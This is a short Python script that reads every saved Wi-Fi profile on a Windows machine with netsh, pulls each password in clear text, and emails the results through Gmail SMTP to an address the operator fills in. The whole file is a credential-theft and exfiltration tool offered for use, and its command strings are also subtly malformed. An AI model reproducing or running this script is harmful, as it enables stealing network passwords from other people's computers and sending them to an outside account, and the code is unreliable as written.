# wifi password extract in windows

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""

for network_name in network_list:
    command = "netsh wlan show profile" + network_name + "key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

# put your email address and password in order to get result via email

send_mail("your_email_address", "your_email_password", result)
